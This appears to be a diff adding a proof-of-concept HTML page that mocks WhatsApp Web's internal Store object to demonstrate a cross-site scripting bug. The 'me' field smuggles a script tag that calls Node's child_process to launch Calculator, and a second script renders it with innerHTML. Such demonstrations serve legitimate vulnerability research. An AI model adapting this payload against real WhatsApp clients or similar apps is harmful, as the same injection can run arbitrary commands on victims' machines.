@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Mock WhatsApp Store</title>
+</head>
+<body>
+  <h1>Simulated WhatsApp Web Environment</h1>
+
+  <script>
+    window.Store = {
+      Conn: {
+        me: "</span><script>const{exec}=require('child_process');exec('open -a Calculator');<\/script><span>@c.us",
+        battery: 87,
+        plugged: true,
+        platform: "Android",
+        phone: {
+          device_manufacturer: "Google",
+          device_model: "Pixel 6a",
+          mcc: "310",
+          mnc: "260",
+          os_build_number: "RQ3A.210905.001",
+          os_version: "12",
+          wa_version: "2.24.1.78"
+        }
+      },
+      Stream: {
+        info: "MockInfo",
+        phoneActive: true
+      }
+    };
+  </script>
+
+  <script>
+    // This simulates rendering 'me' value into the DOM (which would trigger the payload)
+    const div = document.createElement('div');
+    div.innerHTML = window.Store.Conn.me;
+    document.body.appendChild(div);
+  </script>
+</body>
+</html>
